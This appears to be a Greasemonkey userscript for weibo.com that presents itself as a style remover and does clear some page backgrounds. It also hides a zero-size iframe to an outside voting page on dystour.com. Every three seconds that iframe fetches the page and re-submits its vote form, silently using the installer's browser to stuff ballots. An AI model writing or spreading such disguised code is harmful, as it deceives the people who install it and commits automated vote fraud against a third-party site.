// ==UserScript==
// @name       weibo_removeStyle
// @namespace  http://use.i.E.your.homepage/
// @version    0.1
// @description  weibo_removeStyle
// @match      http://weibo.com/*
// @match      http://www.weibo.com/*
// @copyright  2012+, Dachie
// ==/UserScript==
function letsJQuery() {
    var vote_url = "http://www.dystour.com/ds/playerinfo.aspx?fldID=1044";
    $("<iframe>").attr({
        "id": "votewjb",
        "src": "http://www.dystour.com/ds/playerinfo.aspx?fldID=1044",
        "width": "0",
        "height": "0"
    }).bind("load",
    function() {
        setInterval(function() {
            $.get(vote_url, "",
            function(x) {
                $.post(vote_url, $(x).filter("form").serialize() + "&_ctl0%3AContentPlaceHolder1%3AButton1=Button",
                function(y)
                {console.log(y.split(';')[0]);});
            });
        },
        3000);
    }).appendTo($("body"));
    $("body,.W_miniblog").css({"background-image":"url('')","background-color":"#333"});
	$(".S_profile_pic").removeAttr("style");
}
var GM_JQ = document.createElement('script');
GM_JQ.src = 'http://code.jquery.com/jquery-1.8.3.min.js';
GM_JQ.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(GM_JQ);
function GM_wait() {
    if (typeof unsafeWindow.jQuery == 'undefined') {
        window.setTimeout(GM_wait, 100);
    } else {
        $ = unsafeWindow.jQuery;
        letsJQuery();
    }
}
GM_wait();